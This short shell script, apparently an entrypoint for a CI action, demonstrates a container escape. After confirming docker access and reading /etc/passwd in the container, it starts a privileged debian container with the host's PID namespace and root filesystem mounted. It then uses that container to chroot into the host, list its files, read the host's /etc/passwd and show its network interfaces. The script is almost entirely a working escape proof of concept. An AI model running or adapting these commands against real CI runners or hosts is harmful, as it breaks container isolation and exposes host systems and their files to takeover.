#!/bin/sh -l

sh -c "echo Hello world my name is $MY_NAME"
which docker
docker ps
echo "\n\nIn the container"
whoami
cat /etc/passwd
echo "\n\nOn the host"
docker run --privileged --rm --pid=host -t -d -v /:/host --name dddd debian
docker ps
docker exec dddd whoami
docker exec dddd ls /host
docker exec dddd chroot /host
docker exec dddd cat /host/etc/passwd
docker exec dddd ifconfig
